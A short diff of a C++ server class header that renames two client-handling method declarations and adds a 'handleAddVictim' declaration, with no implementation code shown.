@@ -70,8 +70,9 @@ class server {
 	void handleResponse(std::string &, session *);
 	void handleAlive(std::string &, std::vector<std::string> &, session *);
 	void handleInit(std::string &, std::vector<std::string> &params, session *client);
-	void getClientsData(std::string &, std::vector<std::string> &params, session *client);
-	void removeClient(std::string &, std::vector<std::string> &params, session *client);
+	void handleGetClientsData(std::string &, std::vector<std::string> &params, session *client);
+	void handleRemoveClient(std::string &, std::vector<std::string> &params, session *client);
+	void handleAddVictim(std::string &, std::vector<std::string> &params, session *client);
 
 	std::mutex clients_data_m_;
 	std::mutex clients_session_m_;
